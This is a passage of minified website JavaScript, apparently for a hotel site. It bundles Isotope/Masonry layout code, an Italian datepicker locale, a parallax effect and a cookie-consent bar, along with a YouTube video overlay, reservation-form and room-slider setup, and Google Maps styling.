define&&define.amd?define("isotope/js/layout-mode",["get-size/get-size","outlayer/outlayer"],e):"object"==typeof exports?module.exports=e(require("get-size"),require("outlayer")):(t.Isotope=t.Isotope||{},t.Isotope.LayoutMode=e(t.getSize,t.Outlayer))}(window,(function(t,e){"use strict";function i(t){this.isotope=t,t&&(this.options=t.options[this.namespace],this.element=t.element,this.items=t.filteredItems,this.size=t.size)}return function(){function t(t){return function(){return e.prototype[t].apply(this.isotope,arguments)}}for(var n=["_resetLayout","_getItemLayoutPosition","_manageStamp","_getContainerSize","_getElementOffset","needsResizeLayout"],o=0,r=n.length;r>o;o++){var s=n[o];i.prototype[s]=t(s)}}(),i.prototype.needsVerticalResizeLayout=function(){var e=t(this.isotope.element);return this.isotope.size&&e&&e.innerHeight!=this.isotope.size.innerHeight},i.prototype._getMeasurement=function(){this.isotope._getMeasurement.apply(this,arguments)},i.prototype.getColumnWidth=function(){this.getSegmentSize("column","Width")},i.prototype.getRowHeight=function(){this.getSegmentSize("row","Height")},i.prototype.getSegmentSize=function(t,e){var i=t+e,n="outer"+e;if(this._getMeasurement(i,n),!this[i]){var o=this.getFirstItemSize();this[i]=o&&o[n]||this.isotope.size["inner"+e]}},i.prototype.getFirstItemSize=function(){var e=this.isotope.filteredItems[0];return e&&e.element&&t(e.element)},i.prototype.layout=function(){this.isotope.layout.apply(this.isotope,arguments)},i.prototype.getSize=function(){this.isotope.getSize(),this.size=this.isotope.size},i.modes={},i.create=function(t,e){function n(){i.apply(this,arguments)}return n.prototype=new i,e&&(n.options=e),n.prototype.namespace=t,i.modes[t]=n,n},i})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("masonry/masonry",["outlayer/outlayer","get-size/get-size","fizzy-ui-utils/utils"],e):"object"==typeof exports?module.exports=e(require("outlayer"),require("get-size"),require("fizzy-ui-utils")):t.Masonry=e(t.Outlayer,t.getSize,t.fizzyUIUtils)}(window,(function(t,e,i){var n=t.create("masonry");return n.prototype._resetLayout=function(){this.getSize(),this._getMeasurement("columnWidth","outerWidth"),this._getMeasurement("gutter","outerWidth"),this.measureColumns();var t=this.cols;for(this.colYs=[];t--;)this.colYs.push(0);this.maxY=0},n.prototype.measureColumns=function(){if(this.getContainerWidth(),!this.columnWidth){var t=this.items[0],i=t&&t.element;this.columnWidth=i&&e(i).outerWidth||this.containerWidth}var n=this.columnWidth+=this.gutter,o=this.containerWidth+this.gutter,r=o/n,s=n-o%n;r=Math[s&&1>s?"round":"floor"](r),this.cols=Math.max(r,1)},n.prototype.getContainerWidth=function(){var t=this.options.isFitWidth?this.element.parentNode:this.element,i=e(t);this.containerWidth=i&&i.innerWidth},n.prototype._getItemLayoutPosition=function(t){t.getSize();var e=t.size.outerWidth%this.columnWidth,n=Math[e&&1>e?"round":"ceil"](t.size.outerWidth/this.columnWidth);n=Math.min(n,this.cols);for(var o=this._getColGroup(n),r=Math.min.apply(Math,o),s=i.indexOf(o,r),a={x:this.columnWidth*s,y:r},l=r+t.size.outerHeight,d=this.cols+1-o.length,c=0;d>c;c++)this.colYs[s+c]=l;return a},n.prototype._getColGroup=function(t){if(2>t)return this.colYs;for(var e=[],i=this.cols+1-t,n=0;i>n;n++){var o=this.colYs.slice(n,n+t);e[n]=Math.max.apply(Math,o)}return e},n.prototype._manageStamp=function(t){var i=e(t),n=this._getElementOffset(t),o=this.options.isOriginLeft?n.left:n.right,r=o+i.outerWidth,s=Math.floor(o/this.columnWidth);s=Math.max(0,s);var a=Math.floor(r/this.columnWidth);a-=r%this.columnWidth?0:1,a=Math.min(this.cols-1,a);for(var l=(this.options.isOriginTop?n.top:n.bottom)+i.outerHeight,d=s;a>=d;d++)this.colYs[d]=Math.max(l,this.colYs[d])},n.prototype._getContainerSize=function(){this.maxY=Math.max.apply(Math,this.colYs);var t={height:this.maxY};return this.options.isFitWidth&&(t.width=this._getContainerFitWidth()),t},n.prototype._getContainerFitWidth=function(){for(var t=0,e=this.cols;--e&&0===this.colYs[e];)t++;return(this.cols-t)*this.columnWidth-this.gutter},n.prototype.needsResizeLayout=function(){var t=this.containerWidth;return this.getContainerWidth(),t!==this.containerWidth},n})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("isotope/js/layout-modes/masonry",["../layout-mode","masonry/masonry"],e):"object"==typeof exports?module.exports=e(require("../layout-mode"),require("masonry-layout")):e(t.Isotope.LayoutMode,t.Masonry)}(window,(function(t,e){"use strict";var i=t.create("masonry"),n=i.prototype._getElementOffset,o=i.prototype.layout,r=i.prototype._getMeasurement;(function(t,e){for(var i in e)t[i]=e[i]})(i.prototype,e.prototype),i.prototype._getElementOffset=n,i.prototype.layout=o,i.prototype._getMeasurement=r;var s=i.prototype.measureColumns;i.prototype.measureColumns=function(){this.items=this.isotope.filteredItems,s.call(this)};var a=i.prototype._manageStamp;return i.prototype._manageStamp=function(){this.options.isOriginLeft=this.isotope.options.isOriginLeft,this.options.isOriginTop=this.isotope.options.isOriginTop,a.apply(this,arguments)},i})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("isotope/js/layout-modes/fit-rows",["../layout-mode"],e):"object"==typeof exports?module.exports=e(require("../layout-mode")):e(t.Isotope.LayoutMode)}(window,(function(t){"use strict";var e=t.create("fitRows");return e.prototype._resetLayout=function(){this.x=0,this.y=0,this.maxY=0,this._getMeasurement("gutter","outerWidth")},e.prototype._getItemLayoutPosition=function(t){t.getSize();var e=t.size.outerWidth+this.gutter,i=this.isotope.size.innerWidth+this.gutter;0!==this.x&&e+this.x>i&&(this.x=0,this.y=this.maxY);var n={x:this.x,y:this.y};return this.maxY=Math.max(this.maxY,this.y+t.size.outerHeight),this.x+=e,n},e.prototype._getContainerSize=function(){return{height:this.maxY}},e})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("isotope/js/layout-modes/vertical",["../layout-mode"],e):"object"==typeof exports?module.exports=e(require("../layout-mode")):e(t.Isotope.LayoutMode)}(window,(function(t){"use strict";var e=t.create("vertical",{horizontalAlignment:0});return e.prototype._resetLayout=function(){this.y=0},e.prototype._getItemLayoutPosition=function(t){t.getSize();var e=(this.isotope.size.innerWidth-t.size.outerWidth)*this.options.horizontalAlignment,i=this.y;return this.y+=t.size.outerHeight,{x:e,y:i}},e.prototype._getContainerSize=function(){return{height:this.y}},e})),function(t,e){"use strict";"function"==typeof define&&define.amd?define(["outlayer/outlayer","get-size/get-size","matches-selector/matches-selector","fizzy-ui-utils/utils","isotope/js/item","isotope/js/layout-mode","isotope/js/layout-modes/masonry","isotope/js/layout-modes/fit-rows","isotope/js/layout-modes/vertical"],(function(i,n,o,r,s,a){return e(t,i,n,o,r,s,a)})):"object"==typeof exports?module.exports=e(t,require("outlayer"),require("get-size"),require("desandro-matches-selector"),require("fizzy-ui-utils"),require("./item"),require("./layout-mode"),require("./layout-modes/masonry"),require("./layout-modes/fit-rows"),require("./layout-modes/vertical")):t.Isotope=e(t,t.Outlayer,t.getSize,t.matchesSelector,t.fizzyUIUtils,t.Isotope.Item,t.Isotope.LayoutMode)}(window,(function(t,e,i,n,o,r,s){var a=t.jQuery,l=String.prototype.trim?function(t){return t.trim()}:function(t){return t.replace(/^\s+|\s+$/g,"")},d=document.documentElement.textContent?function(t){return t.textContent}:function(t){return t.innerText},c=e.create("isotope",{layoutMode:"masonry",isJQueryFiltering:!0,sortAscending:!0});c.Item=r,c.LayoutMode=s,c.prototype._create=function(){for(var t in this.itemGUID=0,this._sorters={},this._getSorters(),e.prototype._create.call(this),this.modes={},this.filteredItems=this.items,this.sortHistory=["original-order"],s.modes)this._initLayoutMode(t)},c.prototype.reloadItems=function(){this.itemGUID=0,e.prototype.reloadItems.call(this)},c.prototype._itemize=function(){for(var t=e.prototype._itemize.apply(this,arguments),i=0,n=t.length;n>i;i++)t[i].id=this.itemGUID++;return this._updateItemsSortData(t),t},c.prototype._initLayoutMode=function(t){var e=s.modes[t],i=this.options[t]||{};this.options[t]=e.options?o.extend(e.options,i):i,this.modes[t]=new e(this)},c.prototype.layout=function(){return!this._isLayoutInited&&this.options.isInitLayout?void this.arrange():void this._layout()},c.prototype._layout=function(){var t=this._getIsInstant();this._resetLayout(),this._manageStamps(),this.layoutItems(this.filteredItems,t),this._isLayoutInited=!0},c.prototype.arrange=function(t){function e(){n.reveal(i.needReveal),n.hide(i.needHide)}this.option(t),this._getIsInstant();var i=this._filter(this.items);this.filteredItems=i.matches;var n=this;this._bindArrangeComplete(),this._isInstant?this._noTransition(e):e(),this._sort(),this._layout()},c.prototype._init=c.prototype.arrange,c.prototype._getIsInstant=function(){var t=void 0!==this.options.isLayoutInstant?this.options.isLayoutInstant:!this._isLayoutInited;return this._isInstant=t,t},c.prototype._bindArrangeComplete=function(){function t(){e&&i&&n&&o.dispatchEvent("arrangeComplete",null,[o.filteredItems])}var e,i,n,o=this;this.once("layoutComplete",(function(){e=!0,t()})),this.once("hideComplete",(function(){i=!0,t()})),this.once("revealComplete",(function(){n=!0,t()}))},c.prototype._filter=function(t){var e=this.options.filter;e=e||"*";for(var i=[],n=[],o=[],r=this._getFilterTest(e),s=0,a=t.length;a>s;s++){var l=t[s];if(!l.isIgnored){var d=r(l);d&&i.push(l),d&&l.isHidden?n.push(l):d||l.isHidden||o.push(l)}}return{matches:i,needReveal:n,needHide:o}},c.prototype._getFilterTest=function(t){return a&&this.options.isJQueryFiltering?function(e){return a(e.element).is(t)}:"function"==typeof t?function(e){return t(e.element)}:function(e){return n(e.element,t)}},c.prototype.updateSortData=function(t){var e;t?(t=o.makeArray(t),e=this.getItems(t)):e=this.items,this._getSorters(),this._updateItemsSortData(e)},c.prototype._getSorters=function(){var t=this.options.getSortData;for(var e in t){var i=t[e];this._sorters[e]=u(i)}},c.prototype._updateItemsSortData=function(t){for(var e=t&&t.length,i=0;e&&e>i;i++)t[i].updateSortData()};var u=function(t){if("string"!=typeof t)return t;var e=l(t).split(" "),i=e[0],n=i.match(/^\[(.+)\]$/),o=function(t,e){return t?function(e){return e.getAttribute(t)}:function(t){var i=t.querySelector(e);return i&&d(i)}}(n&&n[1],i),r=c.sortDataParsers[e[1]];return r?function(t){return t&&r(o(t))}:function(t){return t&&o(t)}};c.sortDataParsers={parseInt:function(t){return parseInt(t,10)},parseFloat:function(t){return parseFloat(t)}},c.prototype._sort=function(){var t=this.options.sortBy;if(t){var e=function(t,e){return function(i,n){for(var o=0,r=t.length;r>o;o++){var s=t[o],a=i.sortData[s],l=n.sortData[s];if(a>l||l>a)return(a>l?1:-1)*((void 0!==e[s]?e[s]:e)?1:-1)}return 0}}([].concat.apply(t,this.sortHistory),this.options.sortAscending);this.filteredItems.sort(e),t!=this.sortHistory[0]&&this.sortHistory.unshift(t)}},c.prototype._mode=function(){var t=this.options.layoutMode,e=this.modes[t];if(!e)throw new Error("No layout mode: "+t);return e.options=this.options[t],e},c.prototype._resetLayout=function(){e.prototype._resetLayout.call(this),this._mode()._resetLayout()},c.prototype._getItemLayoutPosition=function(t){return this._mode()._getItemLayoutPosition(t)},c.prototype._manageStamp=function(t){this._mode()._manageStamp(t)},c.prototype._getContainerSize=function(){return this._mode()._getContainerSize()},c.prototype.needsResizeLayout=function(){return this._mode().needsResizeLayout()},c.prototype.appended=function(t){var e=this.addItems(t);if(e.length){var i=this._filterRevealAdded(e);this.filteredItems=this.filteredItems.concat(i)}},c.prototype.prepended=function(t){var e=this._itemize(t);if(e.length){this._resetLayout(),this._manageStamps();var i=this._filterRevealAdded(e);this.layoutItems(this.filteredItems),this.filteredItems=i.concat(this.filteredItems),this.items=e.concat(this.items)}},c.prototype._filterRevealAdded=function(t){var e=this._filter(t);return this.hide(e.needHide),this.reveal(e.matches),this.layoutItems(e.matches,!0),e.matches},c.prototype.insert=function(t){var e=this.addItems(t);if(e.length){var i,n,o=e.length;for(i=0;o>i;i++)n=e[i],this.element.appendChild(n.element);var r=this._filter(e).matches;for(i=0;o>i;i++)e[i].isLayoutInstant=!0;for(this.arrange(),i=0;o>i;i++)delete e[i].isLayoutInstant;this.reveal(r)}};var h=c.prototype.remove;return c.prototype.remove=function(t){t=o.makeArray(t);var e=this.getItems(t);h.call(this,t);var i=e&&e.length;if(i)for(var n=0;i>n;n++){var r=e[n];o.removeFrom(this.filteredItems,r)}},c.prototype.shuffle=function(){for(var t=0,e=this.items.length;e>t;t++)this.items[t].sortData.random=Math.random();this.options.sortBy="random",this._sort(),this._layout()},c.prototype._noTransition=function(t){var e=this.options.transitionDuration;this.options.transitionDuration=0;var i=t.call(this);return this.options.transitionDuration=e,i},c.prototype.getFilteredItemElements=function(){for(var t=[],e=0,i=this.filteredItems.length;i>e;e++)t.push(this.filteredItems[e].element);return t},c})),function(t){"function"==typeof define&&define.amd?define(["../datepicker"],t):t(jQuery.datepicker)}((function(t){return t.regional.it={closeText:"Chiudi",prevText:"&#x3C;Prec",nextText:"Succ&#x3E;",currentText:"Oggi",monthNames:["Gennaio","Febbraio","Marzo","Aprile","Maggio","Giugno","Luglio","Agosto","Settembre","Ottobre","Novembre","Dicembre"],monthNamesShort:["Gen","Feb","Mar","Apr","Mag","Giu","Lug","Ago","Set","Ott","Nov","Dic"],dayNames:["Domenica","Lunedì","Martedì","Mercoledì","Giovedì","Venerdì","Sabato"],dayNamesShort:["Dom","Lun","Mar","Mer","Gio","Ven","Sab"],dayNamesMin:["D","L","M","M","G","V","S"],weekHeader:"Sm",dateFormat:"dd/mm/yy",firstDay:1,isRTL:!1,showMonthAfterYear:!1,yearSuffix:""},t.setDefaults(t.regional.it),t.regional.it})),function(t){var e=t(window),i=e.height();e.resize((function(){i=e.height()})),t.fn.parallax=function(n,o,r,s){var a,l,d=t(this);function c(){var s=e.scrollTop();d.each((function(){var e=t(this),c=e.offset().top;c+a(e)<s||c>s+i||(r?d.css("backgroundPosition",n+" "+Math.round((l+s)*o)+"px"):d.css("backgroundPosition",n+" "+Math.round((l-s)*o)+"px"))}))}d.each((function(){l=d.offset().top})),a=s?function(t){return t.outerHeight(!0)}:function(t){return t.height()},(arguments.length<1||null===n)&&(n="50%"),(arguments.length<2||null===o)&&(o=.1),(arguments.length<3||null===s)&&(s=!0),e.bind("scroll",c).resize(c),c()}}(jQuery),function(t){"function"==typeof define&&define.amd?define(["jquery"],t):t("object"==typeof module&&module.exports?require("jquery"):jQuery)}((function(t){function e(e,i){var o=this,r=t(o);if(o.value==r.attr("placeholder")&&r.hasClass(u.customClass))if(r.data("placeholder-password")){if(r=r.hide().nextAll('input[type="password"]:first').show().attr("id",r.removeAttr("id").data("placeholder-id")),!0===e)return r[0].value=i;r.focus()}else o.value="",r.removeClass(u.customClass),o==n()&&o.select()}function i(){var i,n=this,o=t(n),r=this.id;if(""===n.value){if("password"===n.type){if(!o.data("placeholder-textinput")){try{i=o.clone().prop({type:"text"})}catch(e){i=t("<input>").attr(t.extend(function(e){var i={},n=/^jQuery\d+$/;return t.each(e.attributes,(function(t,e){e.specified&&!n.test(e.name)&&(i[e.name]=e.value)})),i}(this),{type:"text"}))}i.removeAttr("name").data({"placeholder-password":o,"placeholder-id":r}).bind("focus.placeholder",e),o.data({"placeholder-textinput":i,"placeholder-id":r}).before(i)}o=o.removeAttr("id").hide().prevAll('input[type="text"]:first').attr("id",r).show()}o.addClass(u.customClass),o[0].value=o.attr("placeholder")}else o.removeClass(u.customClass)}function n(){try{return document.activeElement}catch(t){}}var o,r,s="[object OperaMini]"==Object.prototype.toString.call(window.operamini),a="placeholder"in document.createElement("input")&&!s,l="placeholder"in document.createElement("textarea")&&!s,d=t.valHooks,c=t.propHooks;if(a&&l)(r=t.fn.placeholder=function(){return this}).input=r.textarea=!0;else{var u={};(r=t.fn.placeholder=function(n){return u=t.extend({},{customClass:"placeholder"},n),this.filter((a?"textarea":":input")+"[placeholder]").not("."+u.customClass).bind({"focus.placeholder":e,"blur.placeholder":i}).data("placeholder-enabled",!0).trigger("blur.placeholder"),this}).input=a,r.textarea=l,o={get:function(e){var i=t(e),n=i.data("placeholder-password");return n?n[0].value:i.data("placeholder-enabled")&&i.hasClass(u.customClass)?"":e.value},set:function(o,r){var s=t(o),a=s.data("placeholder-password");return a?a[0].value=r:s.data("placeholder-enabled")?(""===r?(o.value=r,o!=n()&&i.call(o)):s.hasClass(u.customClass)&&e.call(o,!0,r)||(o.value=r),s):o.value=r}},a||(d.input=o,c.value=o),l||(d.textarea=o,c.value=o),t((function(){t(document).delegate("form","submit.placeholder",(function(){var n=t("."+u.customClass,this).each(e);setTimeout((function(){n.each(i)}),10)}))})),t(window).bind("beforeunload.placeholder",(function(){t("."+u.customClass).each((function(){this.value=""}))}))}}));var cookieObj={set:function(t,e,i){var n=new Date;n.setTime(n.getTime()+24*i*60*60*1e3);var o="expires="+n.toUTCString();document.cookie=t+"="+e+"; "+o+"; path=/"},get:function(t){for(var e=t+"=",i=document.cookie.split(";"),n=0;n<i.length;n++){for(var o=i[n];" "==o.charAt(0);)o=o.substring(1);if(0==o.indexOf(e))return o.substring(e.length,o.length)}return""}},matchHex=function(t){return t=t.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i,(function(t,e,i,n){return e+e+i+i+n+n})),/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(t)},hexToRgb=function(t){var e=matchHex(t);return e?"rgb("+parseInt(e[1],16)+", "+parseInt(e[2],16)+", "+parseInt(e[3],16)+")":""},hexToRgba=function(t,e){var i=matchHex(t);return i?"rgba("+parseInt(i[1],16)+", "+parseInt(i[2],16)+", "+parseInt(i[3],16)+", "+e+")":""},showCookieBar=function(t){var e=(t=t||{}).containerTag||"div",i=t.containerId||"cookie-msg",n=t.containerClasses||"",o=t.textWrapperTag||"p",r=t.textWrapperId||"",s=t.textWrapperClasses||"",a=t.textAlign||"center",l=t.fontSize||"0.9em",d=t.position||"fixed",c=t.top||!1,u=t.bottom||!0,h=t.zIndex||"9999",p=t.width||"100%",f=t.padding||"12px",g=t.color||"#FFF",m=t.backgroundColor||"#000",v=t.backgroundOpacity||"0.9",y=t.textContent||{it:"Questo sito web utilizza i cookie per assicurarti la migliore esperienza di navigazione possibile. Navigandolo ne accetti l'utilizzo: per avere maggiori informazioni puoi consultare la [LINK] <a href='javascript:void(0);' id='cookie-accept'>accetta</a>",en:"We use cookies to ensure you get the best experience on our website. By using this website, you accept terms and conditions in full: to learn more please [LINK] <a href='javascript:void(0);' id='cookie-accept'>accept</a>",fr:"We use cookies to ensure you get the best experience on our website. By using this website, you accept terms and conditions in full: to learn more please [LINK] <a href='javascript:void(0);' id='cookie-accept'>accept</a>",de:"We use cookies to ensure you get the best experience on our website. By using this website, you accept terms and conditions in full: to learn more please [LINK] <a href='javascript:void(0);' id='cookie-accept'>accept</a>"},b=t.linkContent||{it:"pagina dedicata alla nostra Cookie Policy",en:"see our Cookie Policy"},x=t.linkHref||{it:"/it/privacy",en:"/en/privacy"},w=t.langTag||"html",k=t.langId||"",_=t.langAttribute||"lang",C=document.createElement(e);i.length>0&&(C.id=i),n.length>0&&(C.className=n),C.style.textAlign=a,C.style.fontSize=l,C.style.position=d,C.style.zIndex=h,C.style.width=p,C.style.padding=f,c&&(C.style.top="0px"),u&&(C.style.bottom="40px"),C.style.color=hexToRgb(g),C.style.background=hexToRgba(m,v);var S="<"+o;r.length>0&&(S+=" id='"+r+"'"),s.length>0&&(S+=" class='"+s+"'"),S+=">";var $=null;w.length>0&&($=document.getElementsByTagName(w)[0]),k.length>0&&($=document.getElementById(k));var T=null!=$?$.getAttribute(_).substring(0,2):"",D="<a href='"+x[T=void 0!==T&&T.length>0?T.toLowerCase():""]+"' target='_blank'>"+b[T]+"</a>";S+=y[T].replace("[LINK]",D),S+="</"+o+">",C.innerHTML=S,""==cookieObj.get("cookie_policy_accepted")&&(document.body.appendChild(C),document.getElementById("cookie-accept").addEventListener("click",(function(){document.getElementById(i).style.display="none",cookieObj.set("cookie_policy_accepted","accepted",365)})))};showCookieBar();var VideoPlugin={loadAPI:function(){if(!$("#youtube-api").length){var t=document.createElement("script");t.id="youtube-api",t.src="//www.youtube.com/iframe_api",document.body.appendChild(t),window.onYouTubeIframeAPIReady=function(){}}},init:function(){var t=this;t.apiLoaded=!1,t.$videoBt=$(".button-play-video"),t.hasVideo=t.$videoBt.length,t.hasVideo&&(t.loadAPI(),t.$videoBt.on("click",(function(e){e.preventDefault(),console.log("video"),$(".video-container").show(),$(".video-container").animate({opacity:1},600),$("body").addClass("show-video");var i=$(window).height()/$(window).width();setTimeout((function(){t.playerObject=new YT.Player(document.getElementById("video-player"),{width:i<.5625?$(window).width():$(window).height()*(1/.5625),height:i<.5625?.5625*$(window).width():$(window).height(),videoId:"VqCjpIADs4Y",playerVars:{autohide:1,autoplay:1,color:"red",controls:0,disablekb:1,enablejsapi:1,fs:0,iv_load_policy:3,loop:0,modestbranding:1,rel:0,showinfo:0}})}),1e3)})),$(".video-container--close").on("click",(function(){$(".video-container").stop().animate({opacity:0},600,(function(){$(".video-container").hide(),t.playerObject.pauseVideo(),$("#video-player").remove(),$(".video-container").append('<div id="video-player"></div>'),$("body").removeClass("show-video")}))})))}};VideoPlugin.init();var $document=$(document),$body=$("body"),$window=$(window),clickEvent=!1;function isValidEmail(t){return/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(t)}var SCREEN={width:null,height:null,getInfo:function(){this.docHeight=$document.height(),this.width=$window.width(),this.height=$window.height()}},HELPER={isValidEmail:function(t){return/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(t)},getPath:function(t){return t.replace(SETTINGS.baseUrl,"")},getBrowser:function(){var t,e=navigator.userAgent,i=e.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[];return/trident/i.test(i[1])?"IE "+((t=/\brv[ :]+(\d+)/g.exec(e)||[])[1]||""):"Chrome"===i[1]&&null!=(t=e.match(/\bOPR\/(\d+)/))?"Opera "+t[1]:(i=i[2]?[i[1],i[2]]:[navigator.appName,navigator.appVersion,"-?"],null!=(t=e.match(/version\/(\d+)/i))&&i.splice(1,1,t[1]),i)}},SETTINGS={},UI={$elements:null,stickyHeaderOffset:0,stickyHeaderTimeout:null,fixHeader:function(){APP.offsetScroll>UI.stickyHeaderOffset&&!$body.hasClass("sticky-header")?$body.addClass("sticky-header"):APP.offsetScroll<=UI.stickyHeaderOffset&&($body.removeClass("sticky-header"),APP.stickyHeaderTimeout&&clearInterval(UI.stickyHeaderTimeout))},showElements:function(){UI.$elements&&UI.$elements.each((function(){var t=$(this),e=t.offset().top;!t.hasClass("showed")&&(APP.offsetScroll>=e-.9*SCREEN.height||APP.offsetScroll>=SCREEN.docHeight-SCREEN.height&&e>=SCREEN.docHeight-SCREEN.height)&&(t.addClass("showed"),t.trigger("circle:show"),t.trigger("draw:draw"))}))},parallaxBg:function(){},parallaxEl:function(){}},CACHE={cachedImages:[],total:0,loaded:0,$elements:null,iterationLoad:function(t,e){var i=this,n=i.$elements.eq(i.loaded),o=new Image;setTimeout((function(){$(o).load((function(){i.loaded++,t&&t(i.loaded/i.total),i.loaded>=i.total&&e?e():i.iterationLoad(t,e)})).error((function(){i.loaded++,t&&t(i.loaded/i.total),i.loaded>=i.total&&e?e():i.iterationLoad(t,e)})).attr("src",n.attr("src"))}),1)},load:function(t,e){var i=this;i.$elements=$("img"),i.total=i.$elements.length,i.loaded=0,i.iterationLoad(t,e)}},LOADING={$status:$("#loading .loading-status"),$logo:$("#loading-svg"),created:!1,init:function(t){var e=this;e.$status=$("#loading .loading-status"),!e.created&&SETTINGS.svg&&(e.created=!0,e.$status.drawCircle(),e.$logo.drawSVG({speed:2,drawOnView:!1})),CACHE.load((function(t){e.$status.trigger("circle:step",[t])}),(function(){setTimeout((function(){e.$status.trigger("circle:step",[0]),APP.start(),setTimeout((function(){LOADING.hide()}),500),setTimeout((function(){APP.scrollHandlers()}),600),t&&t()}),1500)}))},show:function(){$body.addClass("loading")},hide:function(){$body.removeClass("loading")}},APP={$svgIcons:"",offsetScroll:0,menuAnimationDuration:510,handlingMenuAction:!1,$mainContent:$("#mainContent"),$btMenu:$(".bt-menu"),$btReservation:$(".bt-reservation"),$mainMenu:$("nav .main-menu"),$bookingMenu:$("nav .booking-menu"),currentRoom:!1,setFullheight:function(){Modernizr.cssvhunit||$(".vheight").height($window.height())},scrollHandlers:function(){SETTINGS.mobile||UI.showElements(),UI.fixHeader()},resizeHandlers:function(){SCREEN.getInfo(),APP.setFullheight(),UI.stickyHeaderOffset=SCREEN.height/2-50},eventHandlers:function(){APP.$svgIcons=$("[data-nosvg]"),SETTINGS.svg?($(".drawsvg").drawSVG({speed:2,hideStrokeOnEnd:!1,showFillonEnd:!1,drawOnView:!0}),$(".button-round.button-round--compose").drawCircle()):APP.$svgIcons.each((function(){var t=$(this),e=t.data("nosvg");if(e){var i=decodeURI(e).split("|");t.after('<img src="'+i[0]+'"'+(""!=i[1]&&null!=i[1]?' width="'+i[1]+'" ':"")+(""!=i[2]&&null!=i[2]?' height="'+i[2]+'" ':"")+' alt="">')}t.remove()})),$("#rooms-slider .slides").length&&($("#rooms-slider .numbers .total").text(("0"+$("#rooms-slider .room").length).slice(-2)),$("#rooms-slider .slides").slick({infinite:!0,prevArrow:$("#rooms-slider .arrow-left"),nextArrow:$("#rooms-slider .arrow-right")}),$("#rooms-slider .slides").on("afterChange",(function(t,e,i){$("#rooms-slider .numbers .current").text(("0"+(i+1)).slice(-2)),$("#rooms-slider .slides .room-"+i).addClass("slick-show-button")})),$("#rooms-slider .slides").on("beforeChange",(function(t,e,i,n){i!=n&&$("#rooms-slider .room").removeClass("slick-show-button")}))),$("[data-select]").each((function(){$(this).selectOrDie()})),$("#mainContent .reservation-form").reservationForm()},changePage:function(t,e){if(window.currentPage=t.replace(_siteUrl,""),""==window.currentPage.trim()&&(window.currentPage="home"),"/"==window.currentPage.charAt(0)&&(window.currentPage=window.currentPage.substring(1)),$body.removeClass("showmenu showreservation show-reservation-recap"),APP.$btMenu.removeClass("active"),$window.scrollTop()>$window.height())var i=1500;else i=500;$("html, body").animate({scrollTop:0},i,"easeInOutQuart",(function(){!function(t,e){$body.hasClass("changing")||($body.addClass("changing"),UI.$elements.removeClass("showed"),setTimeout((function(){LOADING.show(),setTimeout((function(){e&&(location.href=t),$.get(t,{_:Date.now()},(function(e){var i=$("<div>"+e.html+"</div>");$("title").text(e.title),APP.$mainContent.html(i),VideoPlugin.init(),LOADING.init((function(){window.history.pushState("","",t),$body.removeClass("changing")}))}),"json")}),1500)}),500))}(t,e)}))},start:function(){if(APP.offsetScroll=0,UI.$elements=$(".button-round--compose,.drawsvg,.anim-t,.anim-o,.anim-to,.anim-ro,.anim,.anim-lo"),UI.$elements.trigger("circle:show"),UI.$elements.trigger("draw:draw"),APP.resizeHandlers(),APP.eventHandlers(),Modernizr.touchevents||(UI.parallaxBg(),UI.parallaxEl()),$(".header-reservation .reservation-form").reservationForm(),$("#events-list").length){var t=$("#events-list").isotope({itemSelector:".event-item",layoutMode:"fitRows"});$document.on("change",".events-filters select",(function(){var e=$(this);e.val()?t.isotope({filter:e.val()}):t.isotope({filter:"*"})}))}if($("#map").length){var e=$("#map .map-window-cont").html(),i=new google.maps.Geocoder,n=$("#map").data("address");i.geocode({address:n},(function(t,i){if(i==google.maps.GeocoderStatus.OK){var n=t[0].geometry.location.lat(),o=t[0].geometry.location.lng(),r={center:new google.maps.LatLng(n,o),zoom:9,scrollwheel:!1,disableDefaultUI:!0,styles:[{featureType:"administrative",elementType:"labels.text.fill",stylers:[{color:"#444444"}]},{featureType:"landscape",elementType:"all",stylers:[{color:"#f2f2f2"}]},{featureType:"poi",elementType:"all",stylers:[{visibility:"on"}]},{featureType:"poi",elementType:"geometry.fill",stylers:[{saturation:"-100"},{lightness:"57"}]},{featureType:"poi",elementType:"geometry.stroke",stylers:[{lightness:"1"}]},{featureType:"poi",elementType:"labels",stylers:[{visibility:"off"}]},{featureType:"road",elementType:"all",stylers:[{saturation:-100},{lightness:45}]},{featureType:"road.highway",elementType:"all",stylers:[{visibility:"simplified"}]},{featureType:"road.arterial",elementType:"labels.icon",stylers:[{visibility:"off"}]},{featureType:"transit",elementType:"all",stylers:[{visibility:"off"}]},{featureType:"transit.station.bus",elementType:"all",stylers:[{visibility:"on"}]},{featureType:"transit.station.bus",elementType:"labels.text.fill",stylers:[{saturation:"0"},{lightness:"0"},{gamma:"1.00"},{weight:"1"}]},{featureType:"transit.station.bus",elementType:"labels.icon",stylers:[{saturation:"-100"},{weight:"1"},{lightness:"0"}]},{featureType:"transit.station.rail",elementType:"all",stylers:[{visibility:"on"}]},{featureType:"transit.station.rail",elementType:"labels.text.fill",stylers:[{gamma:"1"},{lightness:"40"}]},{featureType:"transit.station.rail",elementType:"labels.icon",stylers:[{saturation:"-100"},{lightness:"30"}]},{featureType:"water",elementType:"all",stylers:[{color:"#d2d2d2"},{visibility:"on"}]}]},s=new google.maps.Map($("#map")[0],r),a=new InfoBox({content:"Test",disableAutoPan:!1,maxWidth:288,pixelOffset:new google.maps.Size(1,1),zIndex:null,boxStyle:{opacity:1,width:"1px",height:"1px"},closeBoxMargin:"0px",closeBoxURL:"",infoBoxClearance:new google.maps.Size(1,1),isHidden:!1,pane:"floatPane",enableEventPropagation:!0}),l=new google.maps.Marker({position:new 